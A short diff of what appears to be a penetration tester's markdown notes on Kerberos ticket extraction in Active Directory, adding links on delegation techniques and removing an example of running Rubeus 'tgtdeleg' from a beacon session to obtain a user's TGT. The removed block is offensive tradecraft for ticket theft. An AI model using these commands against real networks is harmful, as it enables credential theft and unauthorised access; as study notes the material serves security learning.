@@ -5,7 +5,9 @@
 
 - [[Kerberoasting]] (extracts TGS)
 - [[extract TGTs with Rubeus]] (extracts TGT)
+- [[Local Delegation]] (extracts local TGT)
 - [[Unconstrained Delegation]] (extracts TGT)
+- [[Constrained Delegation]] (uses TGT to ask for TGS)
 
 #### Methods where you are asking for a new ticket
 
@@ -13,16 +15,6 @@
 
 
 ---
-Using TGT delegation method (non elevated session):
-
-```
-beacon> getuid
-[*] You are DEV\bfarmer
-
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
-```
-
-Here you will obtain a TGT ticket of your current session.
 
 ### 🖊️ via Pivoting
 
